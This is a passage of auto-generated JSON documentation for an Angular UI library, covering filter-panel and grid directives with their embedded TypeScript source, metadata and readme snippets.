where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
      },
      {
        "name": "StoFilterTableActions",
        "id": "directive-StoFilterTableActions-b92d3ebb7c61d83c15cb525cadb87804be4d4b07d05d3fd85c3ff27273809d1e3d6be095b8cd41e00f344934d3f95e15f0ca75e111d0f095dff0a668c717f2b8",
        "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  Directive,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnInit,\r\n  Output,\r\n  ViewChild,\r\n  ViewContainerRef,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { FilterForm, FilterList } from './filter';\r\n\r\n/**\r\n * Sto filter panel is an extension of mat-accordion\r\n */\r\n@Component({\r\n  selector: 'sto-filter-panel',\r\n  templateUrl: './sto-filter-panel.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  styleUrls: [ './sto-filter-panel.component.scss' ]\r\n})\r\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\r\n  set contentHeight(contentHeight: number) {\r\n    this._contentHeight = contentHeight;\r\n  }\r\n\r\n  get contentHeight(): number {\r\n    return this._contentHeight;\r\n  }\r\n\r\n  /**\r\n   * If the filter panel should be expandable. Default true.\r\n   */\r\n  @Input()\r\n  expandable = true;\r\n\r\n  /**\r\n   * If the filter panel should be expanded by default. Default false.\r\n   */\r\n  @Input()\r\n  expanded: boolean;\r\n\r\n  /**\r\n   * List of active filters.\r\n   */\r\n  @Input()\r\n  filterList: FilterList[];\r\n\r\n  /**\r\n   * Emits {isExpanded: boolean, contentHeight: number } where\r\n   * isExpanded is true if the panel opens and false if not.\r\n   * ContentHeight is the height of the expanded content i pixels.\r\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\r\n   */\r\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\r\n  /**\r\n   * Emits when a filter should be cleared (if applicable)\r\n   */\r\n  @Output()\r\n  clearFilter = new EventEmitter();\r\n\r\n  /**\r\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\r\n  /**\r\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\r\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\r\n\r\n  @Input()\r\n  public host: FilterForm<Record<string, unknown>>;\r\n  private _contentHeight: number;\r\n\r\n  public hasSeperator = false;\r\n\r\n  constructor(\r\n    private cdr: ChangeDetectorRef,\r\n    private vcRef: ViewContainerRef) {\r\n    try {\r\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n      this.host = ( this.vcRef as any )._view.context;\r\n    } catch ( ex ) {\r\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\r\n    }\r\n  }\r\n\r\n  public toggle() {\r\n    this.expanded = !this.expanded;\r\n    this.setContentHeight();\r\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\r\n  }\r\n\r\n  ngOnInit() {\r\n    if ( this.expandable ) {\r\n      if ( this.expanded === undefined ) {\r\n        this.expanded = true;\r\n      }\r\n    } else {\r\n      this.expanded = false;\r\n    }\r\n\r\n    this.needSeperator();\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.needSeperator();\r\n    this.setContentHeight();\r\n  }\r\n\r\n  private setContentHeight() {\r\n    const element = this.filterForm.nativeElement;\r\n    if ( element ) {\r\n      const contentArea = element.parentElement;\r\n      this.contentHeight = contentArea?.offsetHeight || 0;\r\n    }\r\n  }\r\n\r\n  public needSeperator() {\r\n    this.hasSeperator = false;\r\n    if ( this.contentWrapper && this.contentWrapper2 ) {\r\n      const el1 = this.contentWrapper.nativeElement;\r\n      const el2 = this.contentWrapper2.nativeElement;\r\n      if ( el1.children && el2.children ) {\r\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\r\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\r\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\r\n\r\n          this.hasSeperator = hasActionButtons && hasTableButtons;\r\n          this.cdr.detectChanges();\r\n        }\r\n      }\r\n    }\r\n\r\n\r\n  }\r\n\r\n  _clearFilter(key: string, index?: number) {\r\n    if (index === null) {\r\n      return;\r\n    }\r\n    try {\r\n      this.host.clearFilter(key, index);\r\n    } catch {\r\n      this.clearFilter.emit({ key, index });\r\n    }\r\n  }\r\n}\r\n\r\n/**\r\n * <mat-panel-description> directive.\r\n *\r\n * This direction is to be used inside of the MdExpansionPanelHeader component.\r\n */\r\n@Directive({\r\n  // eslint-disable-next-line @angular-eslint/directive-selector\r\n  selector: 'sto-filter-title'\r\n})\r\nexport class StoFilterTitle {\r\n}\r\n\r\n\r\n@Directive({\r\n  selector: 'sto-filter-table-actions'\r\n})\r\nexport class StoFilterTableActions {\r\n  @HostBinding('class.sto-filter-table-actions')\r\n  className = true;\r\n}\r\n\r\n@Directive({\r\n  selector: 'sto-filter-actions'\r\n})\r\nexport class StoFilterActions {\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-filter-actions-bar',\r\n  template: `\r\n    <ng-content></ng-content>\r\n    <button mat-icon-button\r\n            class=\"toggle-expand-button\"\r\n            *ngIf=\"expandable\"\r\n            title=\"Toggle filter panel\"\r\n            (click)=\"toggle.emit()\">\r\n      <mat-icon>filter_list</mat-icon>\r\n    </button>\r\n\r\n  `\r\n})\r\n// eslint-disable-next-line @angular-eslint/component-class-suffix\r\nexport class StoFilterActionsBar {\r\n  @HostBinding('class.sto-filter-actions')\r\n  hasClass = true;\r\n\r\n  @Input() set expanded(expanded: boolean) {\r\n    this._expanded = expanded;\r\n  }\r\n\r\n  get expanded(): boolean {\r\n    return this._expanded;\r\n  }\r\n\r\n  @Input() expandable: boolean;\r\n  private _expanded: boolean;\r\n\r\n  @Output() toggle = new EventEmitter<void>();\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  onChange(event: unknown) {\r\n    // console.log($event);\r\n  }\r\n\r\n\r\n}\r\n\r\n",
        "selector": "sto-filter-table-actions",
        "providers": [],
        "inputsClass": [],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-filter-table-actions",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 174,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "propertiesClass": [
          {
            "name": "className",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 174,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-filter-table-actions'"
              }
            ]
          }
        ],
        "methodsClass": [],
        "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
      },
      {
        "name": "StoFilterTitle",
        "id": "directive-StoFilterTitle-b92d3ebb7c61d83c15cb525cadb87804be4d4b07d05d3fd85c3ff27273809d1e3d6be095b8cd41e00f344934d3f95e15f0ca75e111d0f095dff0a668c717f2b8",
        "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "directive",
        "description": "<p><mat-panel-description> directive.</p>\n<p>This direction is to be used inside of the MdExpansionPanelHeader component.</p>\n",
        "rawdescription": "\n\n<mat-panel-description> directive.\n\nThis direction is to be used inside of the MdExpansionPanelHeader component.\n",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  Directive,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnInit,\r\n  Output,\r\n  ViewChild,\r\n  ViewContainerRef,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { FilterForm, FilterList } from './filter';\r\n\r\n/**\r\n * Sto filter panel is an extension of mat-accordion\r\n */\r\n@Component({\r\n  selector: 'sto-filter-panel',\r\n  templateUrl: './sto-filter-panel.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  styleUrls: [ './sto-filter-panel.component.scss' ]\r\n})\r\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\r\n  set contentHeight(contentHeight: number) {\r\n    this._contentHeight = contentHeight;\r\n  }\r\n\r\n  get contentHeight(): number {\r\n    return this._contentHeight;\r\n  }\r\n\r\n  /**\r\n   * If the filter panel should be expandable. Default true.\r\n   */\r\n  @Input()\r\n  expandable = true;\r\n\r\n  /**\r\n   * If the filter panel should be expanded by default. Default false.\r\n   */\r\n  @Input()\r\n  expanded: boolean;\r\n\r\n  /**\r\n   * List of active filters.\r\n   */\r\n  @Input()\r\n  filterList: FilterList[];\r\n\r\n  /**\r\n   * Emits {isExpanded: boolean, contentHeight: number } where\r\n   * isExpanded is true if the panel opens and false if not.\r\n   * ContentHeight is the height of the expanded content i pixels.\r\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\r\n   */\r\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\r\n  /**\r\n   * Emits when a filter should be cleared (if applicable)\r\n   */\r\n  @Output()\r\n  clearFilter = new EventEmitter();\r\n\r\n  /**\r\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\r\n  /**\r\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\r\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\r\n\r\n  @Input()\r\n  public host: FilterForm<Record<string, unknown>>;\r\n  private _contentHeight: number;\r\n\r\n  public hasSeperator = false;\r\n\r\n  constructor(\r\n    private cdr: ChangeDetectorRef,\r\n    private vcRef: ViewContainerRef) {\r\n    try {\r\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n      this.host = ( this.vcRef as any )._view.context;\r\n    } catch ( ex ) {\r\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\r\n    }\r\n  }\r\n\r\n  public toggle() {\r\n    this.expanded = !this.expanded;\r\n    this.setContentHeight();\r\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\r\n  }\r\n\r\n  ngOnInit() {\r\n    if ( this.expandable ) {\r\n      if ( this.expanded === undefined ) {\r\n        this.expanded = true;\r\n      }\r\n    } else {\r\n      this.expanded = false;\r\n    }\r\n\r\n    this.needSeperator();\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.needSeperator();\r\n    this.setContentHeight();\r\n  }\r\n\r\n  private setContentHeight() {\r\n    const element = this.filterForm.nativeElement;\r\n    if ( element ) {\r\n      const contentArea = element.parentElement;\r\n      this.contentHeight = contentArea?.offsetHeight || 0;\r\n    }\r\n  }\r\n\r\n  public needSeperator() {\r\n    this.hasSeperator = false;\r\n    if ( this.contentWrapper && this.contentWrapper2 ) {\r\n      const el1 = this.contentWrapper.nativeElement;\r\n      const el2 = this.contentWrapper2.nativeElement;\r\n      if ( el1.children && el2.children ) {\r\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\r\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\r\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\r\n\r\n          this.hasSeperator = hasActionButtons && hasTableButtons;\r\n          this.cdr.detectChanges();\r\n        }\r\n      }\r\n    }\r\n\r\n\r\n  }\r\n\r\n  _clearFilter(key: string, index?: number) {\r\n    if (index === null) {\r\n      return;\r\n    }\r\n    try {\r\n      this.host.clearFilter(key, index);\r\n    } catch {\r\n      this.clearFilter.emit({ key, index });\r\n    }\r\n  }\r\n}\r\n\r\n/**\r\n * <mat-panel-description> directive.\r\n *\r\n * This direction is to be used inside of the MdExpansionPanelHeader component.\r\n */\r\n@Directive({\r\n  // eslint-disable-next-line @angular-eslint/directive-selector\r\n  selector: 'sto-filter-title'\r\n})\r\nexport class StoFilterTitle {\r\n}\r\n\r\n\r\n@Directive({\r\n  selector: 'sto-filter-table-actions'\r\n})\r\nexport class StoFilterTableActions {\r\n  @HostBinding('class.sto-filter-table-actions')\r\n  className = true;\r\n}\r\n\r\n@Directive({\r\n  selector: 'sto-filter-actions'\r\n})\r\nexport class StoFilterActions {\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-filter-actions-bar',\r\n  template: `\r\n    <ng-content></ng-content>\r\n    <button mat-icon-button\r\n            class=\"toggle-expand-button\"\r\n            *ngIf=\"expandable\"\r\n            title=\"Toggle filter panel\"\r\n            (click)=\"toggle.emit()\">\r\n      <mat-icon>filter_list</mat-icon>\r\n    </button>\r\n\r\n  `\r\n})\r\n// eslint-disable-next-line @angular-eslint/component-class-suffix\r\nexport class StoFilterActionsBar {\r\n  @HostBinding('class.sto-filter-actions')\r\n  hasClass = true;\r\n\r\n  @Input() set expanded(expanded: boolean) {\r\n    this._expanded = expanded;\r\n  }\r\n\r\n  get expanded(): boolean {\r\n    return this._expanded;\r\n  }\r\n\r\n  @Input() expandable: boolean;\r\n  private _expanded: boolean;\r\n\r\n  @Output() toggle = new EventEmitter<void>();\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  onChange(event: unknown) {\r\n    // console.log($event);\r\n  }\r\n\r\n\r\n}\r\n\r\n",
        "selector": "sto-filter-title",
        "providers": [],
        "inputsClass": [],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "propertiesClass": [],
        "methodsClass": [],
        "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
      },
      {
        "name": "StoGridColumnDirective",
        "id": "directive-StoGridColumnDirective-58c656e4f218fe8f42bfd4346a68fbcddc2e14b017db910bf9e0ada8f6be20fa43b4d91d7f7c84f64d2c7b1c7187442cc92cbd510cc276c9df6bf544f7dc985b",
        "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\r\n\r\ninterface BreakpointConfig {\r\n  2: number;\r\n  4: number;\r\n}\r\n\r\nconst getClass = (width: number, small = 400, large = 800) => {\r\n  let cols = 1;\r\n  if ( width > small ) {\r\n    cols += 1;\r\n  }\r\n  if ( width > large ) {\r\n    cols += 2;\r\n  }\r\n  return `sto-f-grid--${cols}`;\r\n};\r\n\r\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\r\n\r\n@Directive({ selector: '[stoGridSpacer]' })\r\nexport class StoGridSpacerDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  @HostBinding('class.sto-f-grid__col--spacer')\r\n  useClass = true;\r\n}\r\n\r\n@Directive({ selector: '[stoGridColumn]' })\r\nexport class StoGridColumnDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  useClass = true;\r\n  @HostBinding('class.sto-f-grid__col--2')\r\n  @Input()\r\n  stoGridColumnDouble: boolean;\r\n\r\n}\r\n\r\n@Directive({\r\n  selector: '[stoGrid]',\r\n  exportAs: 'stoGrid'\r\n})\r\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\r\n  @HostBinding('style.max-width.px')\r\n  @Input()\r\n  maxWidth = 1000;\r\n  @HostBinding('style.min-width.px')\r\n  @Input()\r\n  minWidth = 250;\r\n  @HostBinding('class.sto-f-grid')\r\n  baseClass = true;\r\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\r\n  columns: QueryList<ElementRef<HTMLElement>>;\r\n  @Input()\r\n  breakpoints: BreakpointConfig;\r\n\r\n  private observer: ResizeObserver;\r\n\r\n  constructor(\r\n    private elRef: ElementRef<HTMLElement>,\r\n  ) {\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    const el = this.elRef.nativeElement as HTMLElement;\r\n    this.observer = new ResizeObserver(entries => {\r\n      for ( const entry of entries ) {\r\n        const cr = entry.contentRect;\r\n        const { width } = cr;\r\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\r\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\r\n        if ( !el.classList.contains(gridType) ) {\r\n          el.classList.remove(...ALL_GRIDS);\r\n          el.classList.add(gridType);\r\n        }\r\n      }\r\n    });\r\n    this.observer.observe(this.elRef.nativeElement);\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    if ( this.observer ) {\r\n      this.observer.disconnect();\r\n    }\r\n  }\r\n\r\n}\r\n\r\n",
        "selector": "[stoGridColumn]",
        "providers": [],
        "inputsClass": [
          {
            "name": "stoGridColumnDouble",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 34,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-f-grid__col",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 31,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "propertiesClass": [
          {
            "name": "useClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 31,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-f-grid__col'"
              }
            ]
          }
        ],
        "methodsClass": []
      },
      {
        "name": "StoGridDirective",
        "id": "directive-StoGridDirective-58c656e4f218fe8f42bfd4346a68fbcddc2e14b017db910bf9e0ada8f6be20fa43b4d91d7f7c84f64d2c7b1c7187442cc92cbd510cc276c9df6bf544f7dc985b",
        "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\r\n\r\ninterface BreakpointConfig {\r\n  2: number;\r\n  4: number;\r\n}\r\n\r\nconst getClass = (width: number, small = 400, large = 800) => {\r\n  let cols = 1;\r\n  if ( width > small ) {\r\n    cols += 1;\r\n  }\r\n  if ( width > large ) {\r\n    cols += 2;\r\n  }\r\n  return `sto-f-grid--${cols}`;\r\n};\r\n\r\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\r\n\r\n@Directive({ selector: '[stoGridSpacer]' })\r\nexport class StoGridSpacerDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  @HostBinding('class.sto-f-grid__col--spacer')\r\n  useClass = true;\r\n}\r\n\r\n@Directive({ selector: '[stoGridColumn]' })\r\nexport class StoGridColumnDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  useClass = true;\r\n  @HostBinding('class.sto-f-grid__col--2')\r\n  @Input()\r\n  stoGridColumnDouble: boolean;\r\n\r\n}\r\n\r\n@Directive({\r\n  selector: '[stoGrid]',\r\n  exportAs: 'stoGrid'\r\n})\r\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\r\n  @HostBinding('style.max-width.px')\r\n  @Input()\r\n  maxWidth = 1000;\r\n  @HostBinding('style.min-width.px')\r\n  @Input()\r\n  minWidth = 250;\r\n  @HostBinding('class.sto-f-grid')\r\n  baseClass = true;\r\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\r\n  columns: QueryList<ElementRef<HTMLElement>>;\r\n  @Input()\r\n  breakpoints: BreakpointConfig;\r\n\r\n  private observer: ResizeObserver;\r\n\r\n  constructor(\r\n    private elRef: ElementRef<HTMLElement>,\r\n  ) {\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    const el = this.elRef.nativeElement as HTMLElement;\r\n    this.observer = new ResizeObserver(entries => {\r\n      for ( const entry of entries ) {\r\n        const cr = entry.contentRect;\r\n        const { width } = cr;\r\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\r\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\r\n        if ( !el.classList.contains(gridType) ) {\r\n          el.classList.remove(...ALL_GRIDS);\r\n          el.classList.add(gridType);\r\n        }\r\n      }\r\n    });\r\n    this.observer.observe(this.elRef.nativeElement);\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    if ( this.observer ) {\r\n      this.observer.disconnect();\r\n    }\r\n  }\r\n\r\n}\r\n\r\n",
        "selector": "[stoGrid]",
        "providers": [],
        "inputsClass": [
          {
            "name": "breakpoints",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 54,
            "type": "BreakpointConfig",
            "decorators": []
          },
          {
            "name": "maxWidth",
            "defaultValue": "1000",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 45,
            "type": "number",
            "decorators": []
          },
          {
            "name": "minWidth",
            "defaultValue": "250",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 48,
            "type": "number",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-f-grid",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 50,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "propertiesClass": [
          {
            "name": "baseClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 50,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-f-grid'"
              }
            ]
          },
          {
            "name": "columns",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "QueryList<ElementRef<HTMLElement>>",
            "optional": false,
            "description": "",
            "line": 52,
            "decorators": [
              {
                "name": "ContentChildren",
                "stringifiedArguments": "StoGridColumnDirective, {read: ElementRef}"
              }
            ]
          },
          {
            "name": "observer",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "ResizeObserver",
            "optional": false,
            "description": "",
            "line": 56,
            "modifierKind": [
              121
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "ngAfterViewInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 63,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 80,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
            "implements": [
                "AfterViewInit",
                "OnDestroy"
            ],
            "constructorObj": {
              "name": "constructor",
              "description": "",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "elRef",
                  "type": "ElementRef<HTMLElement>",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "line": 56,
              "jsdoctags": [
                {
                  "name": "elRef",
                  "type": "ElementRef<HTMLElement>",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            }
      },
      {
        "name": "StoGridSpacerDirective",
        "id": "directive-StoGridSpacerDirective-58c656e4f218fe8f42bfd4346a68fbcddc2e14b017db910bf9e0ada8f6be20fa43b4d91d7f7c84f64d2c7b1c7187442cc92cbd510cc276c9df6bf544f7dc985b",
        "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
